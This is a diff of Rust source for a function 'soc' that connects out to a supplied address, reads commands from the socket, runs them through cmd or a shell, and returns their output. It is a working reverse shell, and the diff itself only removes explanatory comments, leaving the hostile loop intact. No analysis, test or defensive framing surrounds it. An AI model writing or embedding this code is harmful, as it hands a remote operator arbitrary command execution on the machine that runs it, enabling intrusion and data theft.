@@ -10,14 +10,13 @@ use http::{Request, Response};
 
 
 pub fn soc(address: String) -> std::io::Result<()> {
-    let mut socket = Socket::new(Domain::IPV4, Type::STREAM, None)?; // create a sockett instancce of type stream and ipv4
+    let mut socket = Socket::new(Domain::IPV4, Type::STREAM, None)?; 
     loop {
         let connection: std::io::Result<()> =
             socket.connect(&address.parse::<SocketAddr>().unwrap().into());
-        let mut buffer = [0u8; 512]; // initialize buffer value for the reading the stream
-        let bytes_read = socket.read(&mut buffer).expect("failed to read"); // read and recieve  the stream using socket.read
-
-        // pass the buffer into std::io::process directly, do not store buffer in another value as it will have a ownership issue
+        let mut buffer = [0u8; 512]; 
+        let bytes_read = socket.read(&mut buffer).expect("failed to read"); 
+        
         let output = if cfg!(target_os = "windows") {
             Command::new("cmd")
                 .args(["/C", String::from_utf8_lossy(&buffer[..bytes_read]).trim()])
@@ -31,7 +30,7 @@ pub fn soc(address: String) -> std::io::Result<()> {
                 .expect("failed to execute process")
         };
 
-        let send_data = output.stdout; // sending the data over the stream .
+        let send_data = output.stdout; 
         socket.send(&send_data);
     }
 
